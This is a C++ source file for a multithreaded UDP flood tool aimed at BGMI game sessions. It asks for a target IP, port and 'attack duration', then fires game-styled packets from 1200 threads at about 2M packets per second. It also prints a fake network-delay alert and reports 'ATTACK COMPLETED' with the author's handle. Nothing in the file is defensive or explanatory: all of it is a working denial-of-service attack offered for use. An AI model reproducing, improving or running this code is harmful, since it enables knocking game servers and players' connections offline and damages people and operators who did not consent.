#include <iostream>
#include <iomanip>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <string>
#include <winsock2.h>
#pragma comment(lib, "Ws2_32.lib")

#define PACKET_SIZE 858
#define NUM_THREADS 1200

// BGMI-inspired packet
struct BGMIPacket {
    int playerId;               // 4 bytes
    float x, y, z;              // 12 bytes
    float health;               // 4 bytes
    int weaponId;               // 4 bytes
    int ammo;                   // 4 bytes
    long long matchTime;        // 8 bytes
    int action;                 // 4 bytes
    char padding[818];          // 818 bytes
};

// Shared stats
long long totalPackets = 0;
double totalDataMB = 0.0;
std::mutex statsMutex;
bool keepSending = true;

// List of ports to ignore
const int ignoredPorts[] = {8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030};
const int numIgnoredPorts = sizeof(ignoredPorts) / sizeof(ignoredPorts[0]);

// Check if port is in ignored list
bool isPortIgnored(int port) {
    for (int i = 0; i < numIgnoredPorts; ++i) {
        if (port == ignoredPorts[i]) return true;
    }
    return false;
}

void packetSender(int threadId, int durationSeconds, int targetPort, const std::string& targetIp) {
    WSADATA wsaData;
    SOCKET udpSocket;
    sockaddr_in serverAddr;
    BGMIPacket packet;

    // Initialize packet
    packet.playerId = threadId + 1000;
    packet.x = static_cast<float>(threadId % 1000);
    packet.y = static_cast<float>(threadId % 800);
    packet.z = static_cast<float>(threadId % 100);
    packet.health = 100.0f - (threadId % 50);
    packet.weaponId = (threadId % 5) + 1;
    packet.ammo = 30 - (threadId % 20);
    packet.action = threadId % 3;
    memset(packet.padding, 0, sizeof(packet.padding));

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Thread " << threadId << ": WSAStartup failed (" << WSAGetLastError() << ")\n";
        return;
    }

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket == INVALID_SOCKET) {
        std::cerr << "Thread " << threadId << ": Socket creation failed (" << WSAGetLastError() << ")\n";
        WSACleanup();
        return;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(targetIp.c_str());
    serverAddr.sin_port = htons(targetPort);

    long long threadPackets = 0;
    double threadDataMB = 0.0;
    auto startTime = std::chrono::steady_clock::now();

    while (true) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count();
        if (elapsed >= durationSeconds || !keepSending) break;

        packet.matchTime = std::chrono::duration_cast<std::chrono::milliseconds>(
            now.time_since_epoch()).count();

        int bytesSent = sendto(udpSocket, reinterpret_cast<char*>(&packet), PACKET_SIZE, 0,
                              (sockaddr*)&serverAddr, sizeof(serverAddr));
        if (bytesSent > 0) {
            threadPackets++;
            threadDataMB += bytesSent / (1024.0 * 1024.0);
        }
    }

    {
        std::lock_guard<std::mutex> lock(statsMutex);
        totalPackets += threadPackets;
        totalDataMB += threadDataMB;
    }

    closesocket(udpSocket);
    WSACleanup();
}

void displayFakeMessage(int durationSeconds) {
    auto startTime = std::chrono::steady_clock::now();
    while (keepSending) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count();
        if (elapsed >= durationSeconds) break;

        std::cout << "[GAME ALERT] NETWORK OFF: 677ms delay detected - Now player do okay, they automatically exit\n";
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }
}

int main() {
    int durationSeconds;
    int targetPort;
    std::string targetIp;

    // Get duration
    std::cout << "Enter attack duration in seconds: ";
    std::cin >> durationSeconds;
    if (durationSeconds <= 0) {
        std::cout << "Invalid duration. Using default 13 seconds.\n";
        durationSeconds = 13;
    }

    // Get port with validation
    do {
        std::cout << "Enter target port (avoid 8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030): ";
        std::cin >> targetPort;
        if (isPortIgnored(targetPort)) {
            std::cout << "Port " << targetPort << " is in the ignored list. Please choose another.\n";
        } else if (targetPort < 1 || targetPort > 65535) {
            std::cout << "Invalid port (must be 1-65535). Try again.\n";
        }
    } while (isPortIgnored(targetPort) || targetPort < 1 || targetPort > 65535);

    // Get target IP
    std::cout << "Enter target IP address (e.g., 127.0.0.1): ";
    std::cin >> targetIp;

    std::vector<std::thread> threads;

    // Launch packet-sending threads
    for (int i = 0; i < NUM_THREADS; ++i) {
        threads.emplace_back(packetSender, i, durationSeconds, targetPort, targetIp);
    }

    // Launch fake message thread
    std::thread messageThread(displayFakeMessage, durationSeconds);

    // Smart start message
    std::cout << "UDP Attack Initiated: " << NUM_THREADS << " threads targeting " 
              << targetIp << ":" << targetPort << ", expect ~2M packets/sec for " 
              << durationSeconds << " seconds!\n";

    std::this_thread::sleep_for(std::chrono::seconds(durationSeconds));
    keepSending = false;

    for (auto& t : threads) {
        t.join();
    }
    messageThread.join();

    std::cout << "ATTACK COMPLETED.\n";
    std::cout << "║\n";
    std::cout << "║ TOTAL PACKETS SENT: " << totalPackets << " ║\n";
    std::cout << "║ TOTAL DATA SENT: " << std::fixed << std::setprecision(2) << totalDataMB << " MB ║\n";
    std::cout << "║ ATTACK FINISHED BY @Rohan2349 ║\n";
    std::cout << "║\n";

    return 0;
}